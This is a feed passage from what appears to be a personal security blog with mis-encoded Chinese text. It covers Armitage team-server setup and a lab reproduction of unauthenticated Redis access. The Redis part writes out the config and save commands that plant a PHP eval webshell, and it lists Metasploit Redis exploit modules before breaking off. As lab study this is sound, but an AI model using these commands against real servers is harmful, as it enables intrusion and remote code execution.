    <content type="html"><![CDATA[<h1 id="Armitage"><a href="#Armitage" class="headerlink" title="Armitage"></a>Armitage</h1><h2 id="0x01-ä»€ä¹ˆæ˜¯Armitage"><a href="#0x01-ä»€ä¹ˆæ˜¯Armitage" class="headerlink" title="0x01.ä»€ä¹ˆæ˜¯Armitage"></a>0x01.ä»€ä¹ˆæ˜¯Armitage</h2><blockquote><p>Armitage æ˜¯ä¸€ä¸ªç”¨äº<span class="exturl" data-url="aHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbS8=">Metasploit<i class="fa fa-external-link-alt"></i></span>çš„<span class="exturl" data-url="aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCM4">å¯ç¼–å†™è„šæœ¬çš„<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCNtdWx0aQ==">çº¢é˜Ÿåä½œ<i class="fa fa-external-link-alt"></i></span>å·¥å…·ï¼Œå¯å°†ç›®æ ‡å¯è§†åŒ–ã€æ¨èæ¼æ´åˆ©ç”¨å¹¶å…¬å¼€æ¡†æ¶ä¸­çš„é«˜çº§åæ¼æ´åˆ©ç”¨åŠŸèƒ½ã€‚</p><p>é€šè¿‡ä¸€ä¸ª Metasploit å®ä¾‹ï¼Œæ‚¨çš„å›¢é˜Ÿå°†ï¼š</p><ul><li>ä½¿ç”¨ç›¸åŒçš„ä¼šè¯</li><li>å…±äº«ä¸»æœºã€æ•è·çš„æ•°æ®å’Œä¸‹è½½çš„æ–‡ä»¶</li><li>é€šè¿‡å…±äº«äº‹ä»¶æ—¥å¿—è¿›è¡Œé€šä¿¡ã€‚</li><li>è¿è¡Œæœºå™¨äººä»¥è‡ªåŠ¨æ‰§è¡Œçº¢é˜Ÿä»»åŠ¡ã€‚</li></ul><p>Armitage æ˜¯<span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk">çº¢é˜Ÿè¡ŒåŠ¨<i class="fa fa-external-link-alt"></i></span>çš„<span class="exturl" data-url="aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk">åŠ›é‡å€å¢å™¨<i class="fa fa-external-link-alt"></i></span>ã€‚</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS8=">Cobalt Strike<i class="fa fa-external-link-alt"></i></span>æ˜¯ç”¨äº<span class="exturl" data-url="aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA4LzAzL3JhcGhhZWxzLW1hZ2ljLXF1YWRyYW50Lw==">å¯¹æ‰‹æ¨¡æ‹Ÿ<i class="fa fa-external-link-alt"></i></span>å’Œ<span class="exturl" data-url="aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA3LzA5L21vZGVscy1mb3ItcmVkLXRlYW0tb3BlcmF0aW9ucy8=">çº¢é˜Ÿè¡ŒåŠ¨<i class="fa fa-external-link-alt"></i></span>çš„å·¥å…·é›†ã€‚æˆªè‡³ 2015 å¹´ 10 æœˆï¼ŒCobalt Strike ä¸ä¸ Armitage å…±äº«ä»£ç ï¼Œä¹Ÿä¸ä¾èµ–äº Metasploit æ¡†æ¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ Armitage é€šè¿‡ Metasploit æ¼æ´åˆ©ç”¨æ¥è§¦å‘ Cobalt Strike çš„ Beacon æœ‰æ•ˆè½½è·ã€‚æ‚¨è¿˜å¯ä»¥é€šè¿‡ Cobalt Strike Beacon éš§é“ä¼ è¾“ Metasploit æ”»å‡»ã€‚</p></blockquote><a id="more"></a><h2 id="0x02-å®‰è£…ä½¿ç”¨"><a href="#0x02-å®‰è£…ä½¿ç”¨" class="headerlink" title="0x02.å®‰è£…ä½¿ç”¨"></a>0x02.å®‰è£…ä½¿ç”¨</h2><p><code>é¦–å…ˆè¿›å…¥armitageç›®å½•</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/armitage]</span><br><span class="line">â””â”€# ./teamserver 192.168.1.7 pass</span><br><span class="line">[*] Generating X509 certificate and keystore (for SSL)</span><br><span class="line">[*] Starting RPC daemon</span><br><span class="line">[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg...</span><br><span class="line">[*] MSGRPC backgrounding at 2021-07-19 05:02:00 -0400...</span><br><span class="line">[*] MSGRPC background PID 8183</span><br><span class="line">[*] sleeping for 20s (to let msfrpcd initialize)</span><br><span class="line">[*] Starting Armitage team server</span><br><span class="line">[*] Use the following connection details to connect your clients:</span><br><span class="line">        Host: 192.168.1.7</span><br><span class="line">        Port: 55553</span><br><span class="line">        User: msf</span><br><span class="line">        Pass: pass</span><br><span class="line"></span><br><span class="line">[*] Fingerprint (check for this string when you connect):</span><br><span class="line">        6ad0a753836d3ae33fc409bcc19c4523b1701210</span><br><span class="line">[+] hacking is such a lonely thing, until now</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>å®¢æˆ·ç«¯è¿æ¥å³å¯</code></p><img src="/2021/07/19/Armitage/image-20210719170502446.png" class><img src="/2021/07/19/Armitage/image-20210719170541740.png" class><h2 id="0x03-Redisæœªæˆæƒè®¿é—®åˆ©ç”¨"><a href="#0x03-Redisæœªæˆæƒè®¿é—®åˆ©ç”¨" class="headerlink" title="0x03.Redisæœªæˆæƒè®¿é—®åˆ©ç”¨"></a>0x03.Redisæœªæˆæƒè®¿é—®åˆ©ç”¨</h2><blockquote><p>ä¹‹å‰å¤ç°è¿‡Redisæœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ‰‹å¤´ç¯å¢ƒè¿˜æ²¡é”€æ¯ã€‚ã€‚ã€‚</p></blockquote><h3 id="01-æœç´¢Redis"><a href="#01-æœç´¢Redis" class="headerlink" title="01.æœç´¢Redis"></a>01.æœç´¢Redis</h3><img src="/2021/07/19/Armitage/image-20210719170906841.png" class><h3 id="02-redis-replication-cmd-execåˆ©ç”¨"><a href="#02-redis-replication-cmd-execåˆ©ç”¨" class="headerlink" title="02.redis_replication_cmd_execåˆ©ç”¨"></a>02.redis_replication_cmd_execåˆ©ç”¨</h3><p><code>åŒå‡»å³å¯è¿›è¡Œé…ç½®</code></p><img src="/2021/07/19/Armitage/image-20210719171145861.png" class><h3 id="03-ç‚¹å‡»Launchå³å¯åˆ©ç”¨"><a href="#03-ç‚¹å‡»Launchå³å¯åˆ©ç”¨" class="headerlink" title="03.ç‚¹å‡»Launchå³å¯åˆ©ç”¨"></a>03.ç‚¹å‡»Launchå³å¯åˆ©ç”¨</h3><p><code>åˆ©ç”¨æˆåŠŸ</code></p><img src="/2021/07/19/Armitage/image-20210719171315981.png" class><h3 id="04-shellè·å–"><a href="#04-shellè·å–" class="headerlink" title="04.shellè·å–"></a>04.shellè·å–</h3><p><code>å³é”®</code></p><img src="/2021/07/19/Armitage/image-20210719171405205.png" class><p><code>è·å–root shell</code></p><img src="/2021/07/19/Armitage/image-20210719171509977.png" class>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Armitage&quot;&gt;&lt;a href=&quot;#Armitage&quot; class=&quot;headerlink&quot; title=&quot;Armitage&quot;&gt;&lt;/a&gt;Armitage&lt;/h1&gt;&lt;h2 id=&quot;0x01-ä»€ä¹ˆæ˜¯Armitage&quot;&gt;&lt;a href=&quot;#0x01-ä»€ä¹ˆæ˜¯Armitage&quot; class=&quot;headerlink&quot; title=&quot;0x01.ä»€ä¹ˆæ˜¯Armitage&quot;&gt;&lt;/a&gt;0x01.ä»€ä¹ˆæ˜¯Armitage&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Armitage æ˜¯ä¸€ä¸ªç”¨äº&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5tZXRhc3Bsb2l0LmNvbS8=&quot;&gt;Metasploit&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;çš„&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCM4&quot;&gt;å¯ç¼–å†™è„šæœ¬çš„&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt; &lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy5mYXN0YW5kZWFzeWhhY2tpbmcuY29tL21hbnVhbCNtdWx0aQ==&quot;&gt;çº¢é˜Ÿåä½œ&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;å·¥å…·ï¼Œå¯å°†ç›®æ ‡å¯è§†åŒ–ã€æ¨èæ¼æ´åˆ©ç”¨å¹¶å…¬å¼€æ¡†æ¶ä¸­çš„é«˜çº§åæ¼æ´åˆ©ç”¨åŠŸèƒ½ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡ä¸€ä¸ª Metasploit å®ä¾‹ï¼Œæ‚¨çš„å›¢é˜Ÿå°†ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨ç›¸åŒçš„ä¼šè¯&lt;/li&gt;
&lt;li&gt;å…±äº«ä¸»æœºã€æ•è·çš„æ•°æ®å’Œä¸‹è½½çš„æ–‡ä»¶&lt;/li&gt;
&lt;li&gt;é€šè¿‡å…±äº«äº‹ä»¶æ—¥å¿—è¿›è¡Œé€šä¿¡ã€‚&lt;/li&gt;
&lt;li&gt;è¿è¡Œæœºå™¨äººä»¥è‡ªåŠ¨æ‰§è¡Œçº¢é˜Ÿä»»åŠ¡ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Armitage æ˜¯&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk&quot;&gt;çº¢é˜Ÿè¡ŒåŠ¨&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;çš„&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL3d3dy55b3V0dWJlLmNvbS93YXRjaD92PUctSmFIV2FMbWdjJmZlYXR1cmU9cGxheWVyX2VtYmVkZGVk&quot;&gt;åŠ›é‡å€å¢å™¨&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuY29iYWx0c3RyaWtlLmNvbS8=&quot;&gt;Cobalt Strike&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;æ˜¯ç”¨äº&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA4LzAzL3JhcGhhZWxzLW1hZ2ljLXF1YWRyYW50Lw==&quot;&gt;å¯¹æ‰‹æ¨¡æ‹Ÿ&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;å’Œ&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cDovL2Jsb2cuY29iYWx0c3RyaWtlLmNvbS8yMDE1LzA3LzA5L21vZGVscy1mb3ItcmVkLXRlYW0tb3BlcmF0aW9ucy8=&quot;&gt;çº¢é˜Ÿè¡ŒåŠ¨&lt;i class=&quot;fa fa-external-link-alt&quot;&gt;&lt;/i&gt;&lt;/span&gt;çš„å·¥å…·é›†ã€‚æˆªè‡³ 2015 å¹´ 10 æœˆï¼ŒCobalt Strike ä¸ä¸ Armitage å…±äº«ä»£ç ï¼Œä¹Ÿä¸ä¾èµ–äº Metasploit æ¡†æ¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ Armitage é€šè¿‡ Metasploit æ¼æ´åˆ©ç”¨æ¥è§¦å‘ Cobalt Strike çš„ Beacon æœ‰æ•ˆè½½è·ã€‚æ‚¨è¿˜å¯ä»¥é€šè¿‡ Cobalt Strike Beacon éš§é“ä¼ è¾“ Metasploit æ”»å‡»ã€‚&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="kali" scheme="https://lunamoore.github.io/categories/kali/"/>
    
    <category term="Armitage" scheme="https://lunamoore.github.io/categories/kali/Armitage/"/>
    
    
    <category term="Armitage" scheme="https://lunamoore.github.io/tags/Armitage/"/>
    
    <category term="Redis" scheme="https://lunamoore.github.io/tags/Redis/"/>
    
    <category term="security tools" scheme="https://lunamoore.github.io/tags/security-tools/"/>
    
  </entry>
  
  <entry>
    <title>Redisæœªæˆæƒè®¿é—®</title>
    <link href="https://lunamoore.github.io/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>https://lunamoore.github.io/2021/07/19/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
    <published>2021-07-19T07:40:38.000Z</published>
    <updated>2021-07-19T08:04:24.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redisæœªæˆæƒè®¿é—®æ¼æ´"><a href="#Redisæœªæˆæƒè®¿é—®æ¼æ´" class="headerlink" title="Redisæœªæˆæƒè®¿é—®æ¼æ´"></a>Redisæœªæˆæƒè®¿é—®æ¼æ´</h1><h2 id="ä¸€ã€æ¼æ´ç®€ä»‹"><a href="#ä¸€ã€æ¼æ´ç®€ä»‹" class="headerlink" title="ä¸€ã€æ¼æ´ç®€ä»‹"></a>ä¸€ã€æ¼æ´ç®€ä»‹</h2><blockquote><p>Redisé»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨0.0.0.0:6379(åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™)ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç­‰ï¼Œè¿™æ ·å°†ä¼šå°†RedisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯(é»˜è®¤ä¸ºç©º)çš„æƒ…å†µä¸‹ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—®Redisä»¥åŠè¯»å–Redisçš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—®Redisçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨Redisè‡ªèº«çš„æä¾›çš„configå‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…è¿˜å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„/root/.sshæ–‡ä»¶çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡å™¨ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>æ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹:</p><p>(1)  Redisç»‘å®šåœ¨0.0.0.0:6379,ä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æºipè®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘</p><p>(2)  æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆé»˜è®¤ä¸ºç©ºï¼‰æˆ–è€…å¼±å¯†ç ï¼Œå¯ä»¥å…å¯†ç ç™»å½•redisæœåŠ¡</p></blockquote><a id="more"></a><h2 id="äºŒã€å½±å“èŒƒå›´"><a href="#äºŒã€å½±å“èŒƒå›´" class="headerlink" title="äºŒã€å½±å“èŒƒå›´"></a>äºŒã€å½±å“èŒƒå›´</h2><p>Redis 2.xï¼Œ3.xï¼Œ4.xï¼Œ5.x</p><h2 id="ä¸‰ã€æ¼æ´å±å®³"><a href="#ä¸‰ã€æ¼æ´å±å®³" class="headerlink" title="ä¸‰ã€æ¼æ´å±å®³"></a>ä¸‰ã€æ¼æ´å±å®³</h2><p>(1) æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®,å¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œé»‘å®¢ä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®</p><p>(2) æ”»å‡»è€…å¯é€šè¿‡evalæ‰§è¡Œluaä»£ç ï¼Œæˆ–é€šè¿‡æ•°æ®å¤‡ä»½åŠŸèƒ½å¾€ç£ç›˜å†™å…¥åé—¨æ–‡ä»¶</p><p>(3) å¦‚æœredisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•ç›®æ ‡æœåŠ¡å™¨ </p><h2 id="å››ã€å¤ç°è¿‡ç¨‹"><a href="#å››ã€å¤ç°è¿‡ç¨‹" class="headerlink" title="å››ã€å¤ç°è¿‡ç¨‹"></a>å››ã€å¤ç°è¿‡ç¨‹</h2><blockquote><p>ç¯å¢ƒï¼š</p><p>kaliï¼š192.168.1.7</p><p>redis(centos7)ï¼š192.168.1.9</p></blockquote><h3 id="1-ç¯å¢ƒå®‰è£…"><a href="#1-ç¯å¢ƒå®‰è£…" class="headerlink" title="1.ç¯å¢ƒå®‰è£…"></a>1.ç¯å¢ƒå®‰è£…</h3><p><code>æœ¬æ¬¡ä½¿ç”¨4.0.0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ä»å®˜ç½‘wgetåˆ°æœ¬åœ°</span><br><span class="line">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-4.0.0.tar.gz </span><br><span class="line">tar xzf redis-4.0.0.tar.gz</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">å»æ‰ipç»‘å®šï¼Œå…è®¸é™¤æœ¬åœ°å¤–çš„ä¸»æœºè¿œç¨‹ç™»å½•redisæœåŠ¡</span><br><span class="line">(1)bind 127.0.0.1å‰é¢åŠ ä¸Š##å·æ³¨é‡Šæ‰ æˆ–è€…æ›´æ”¹æˆ 0.0.0.0</span><br><span class="line">(2)protected-modeè®¾ä¸ºno</span><br><span class="line"></span><br><span class="line">å¯åŠ¨</span><br><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure><p><code>ç™»å…¥</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~]</span><br><span class="line">â””â”€# redis-cli  -h 192.168.1.9</span><br><span class="line">192.168.1.9:6379&gt; keys *</span><br><span class="line">(empty list or set)</span><br><span class="line">192.168.1.9:6379&gt;</span><br></pre></td></tr></table></figure><p><code>æ”»å‡»è€…å¸¸ç”¨å‘½ä»¤</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰info                       æŸ¥çœ‹ä¿¡æ¯     </span><br><span class="line">ï¼ˆ2ï¼‰flushall                 åˆ é™¤æ‰€æœ‰ç¼“å­˜æ•°æ®åº“ï¼š</span><br><span class="line">ï¼ˆ3ï¼‰flushdb                    åˆ·æ–°æ•°æ®åº“</span><br><span class="line">ï¼ˆ4ï¼‰çœ‹æ‰€æœ‰é”®ï¼šKEYS *ï¼Œä½¿ç”¨select numå¯ä»¥æŸ¥çœ‹é”®å€¼æ•°æ®ã€‚</span><br><span class="line">ï¼ˆ5ï¼‰set test &quot;who am i&quot;        è®¾ç½®å˜é‡</span><br><span class="line">ï¼ˆ6ï¼‰config set dir dirpath     è®¾ç½®è·¯å¾„ç­‰é…ç½®</span><br><span class="line">ï¼ˆ7ï¼‰config get dir&#x2F;dbfilename  è·å–è·¯å¾„åŠæ•°æ®é…ç½®ä¿¡æ¯</span><br><span class="line">ï¼ˆ8ï¼‰save                       ä¿å­˜</span><br><span class="line">ï¼ˆ9ï¼‰get                        å˜é‡ï¼ŒæŸ¥çœ‹å˜é‡åç§°</span><br></pre></td></tr></table></figure><h3 id="2-æ¼æ´åˆ©ç”¨"><a href="#2-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.æ¼æ´åˆ©ç”¨"></a>2.æ¼æ´åˆ©ç”¨</h3><h4 id="01-å†™å…¥åé—¨æ–‡ä»¶"><a href="#01-å†™å…¥åé—¨æ–‡ä»¶" class="headerlink" title="01.å†™å…¥åé—¨æ–‡ä»¶"></a>01.å†™å…¥åé—¨æ–‡ä»¶</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# ll shell.php</span><br><span class="line">-rw-r--r--. 1 root root 191 Jul 18 02:19 shell.php</span><br><span class="line">[root@mail tmp]# cat shell.php</span><br><span class="line">REDIS0008â–’      redis-ver4.0.0â–’</span><br><span class="line">redis-bitsâ–’@â–’ctimeâ–’â–’â–’â–’`used-memï¿½â–’</span><br><span class="line">â–’</span><br><span class="line">aof-preambleâ–’â–’repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64â–’</span><br><span class="line">                                                               repl-offsetâ–’â–’webshell&lt;?php phpinfo();?&gt;â–’hŞŒâ–’Sâ–’+,[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure><p><code>å¦ä¸€ç§å†™å…¥webshell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.9:6379&gt; CONFIG SET dir /tmp</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; SET demo &quot;\n\n\n&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;\n\n\n&quot;</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; CONFIG SET dbfilename web.php</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.9:6379&gt;</span><br><span class="line"></span><br><span class="line">[root@mail tmp]# cat web.php</span><br><span class="line">REDIS0008â–’      redis-ver4.0.0â–’</span><br><span class="line">redis-bitsâ–’@â–’ctimeâ–’â–’`used-memâ–’Øœ</span><br><span class="line">â–’</span><br><span class="line">aof-preambleâ–’â–’repl-id(2bb416a4f7439bfd8932320f435556c4747d5e64â–’</span><br><span class="line">                                                               repl-offsetâ–’â–’â–’demo#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">                                                                                                                       â–’â–’?â–’â–’/â–’[root@mail tmp]# xterm-256colorxterm-256color</span><br><span class="line">-bash: xterm-256colorxterm-256color: command not found</span><br><span class="line">[root@mail tmp]#</span><br></pre></td></tr></table></figure><h4 id="02-MSFè¿›è¡Œåˆ©ç”¨"><a href="#02-MSFè¿›è¡Œåˆ©ç”¨" class="headerlink" title="02.MSFè¿›è¡Œåˆ©ç”¨"></a>02.MSFè¿›è¡Œåˆ©ç”¨</h4><p><code>å…±æœ‰5ä¸ªæ¨¡å—å¯ä»¥åˆ©ç”¨</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search redis</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta">   #</span><span class="bash">  Name                                                      Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                                      ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/gather/ibm_bigfix_sites_packages_enum           2019-03-18       normal     No     IBM BigFix Relay Server Sites and Package Enum</span><br><span class="line">   1  exploit/windows/browser/ie_createobject                   2006-04-11       excellent  No     MS06-014 Microsoft Internet Explorer COM CreateObject Code Execution</span><br><span class="line">   2  auxiliary/scanner/redis/redis_server                                       normal     No     Redis Command Execute Scanner</span><br><span class="line">   3  auxiliary/gather/redis_extractor                                           normal     Yes    Redis Extractor</span><br><span class="line">   4  auxiliary/scanner/redis/file_upload                       2015-11-11       normal     No     Redis File Upload</span><br><span class="line">   5  auxiliary/scanner/redis/redis_login                                        normal     No     Redis Login Utility</span><br><span class="line">   6  exploit/linux/redis/redis_replication_cmd_exec            2018-11-13       good       Yes    Redis Replication Code Execution</span><br><span class="line">   7  exploit/windows/browser/webex_ucf_newobject               2008-08-06       good       No     WebEx UCF atucfobj.dll ActiveX NewObject Method Buffer Overflow</span><br><span class="line">   8  exploit/windows/browser/ms07_017_ani_loadimage_chunksize  2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)</span><br><span class="line">   9  exploit/windows/email/ms07_017_ani_loadimage_chunksize    2007-03-28       great      No     Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 9, use 9 or use exploit/windows/email/ms07_017_ani_loadimage_chunksize</span><br></pre></td></tr></table></figure><h5 id="1-exploit-linux-redis-redis-replication-cmd-exec"><a href="#1-exploit-linux-redis-redis-replication-cmd-exec" class="headerlink" title="1.exploit/linux/redis/redis_replication_cmd_exec"></a>1.exploit/linux/redis/redis_replication_cmd_exec</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 